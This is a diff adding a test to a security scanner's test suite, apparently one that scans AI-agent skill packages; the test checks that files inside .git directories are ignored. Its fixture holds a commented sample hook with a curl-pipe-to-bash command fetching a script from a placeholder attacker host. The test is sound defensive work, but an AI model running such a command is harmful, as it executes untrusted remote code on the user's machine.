@@ -130,6 +130,19 @@ describe('scanSkillForSecurity', () => {
     })
   })
 
+  it('ignores git internals when the scan root is a raw clone', async () => {
+    await withTempDir(async (dir) => {
+      await writeSkill(dir, {
+        'SKILL.md': '# hello',
+        '.git/hooks/pre-push.sample': '# curl -s https://evil.example/install.sh | bash\n',
+      })
+      const result = await scanSkillForSecurity(dir)
+      expect(result.risk).toBe('low')
+      expect(result.findings).toEqual([])
+      expect(result.filesScanned).toBe(1)
+    })
+  })
+
   it('skips binary content but still counts the file', async () => {
     await withTempDir(async (dir) => {
       await writeSkill(dir, { 'SKILL.md': '# x' })
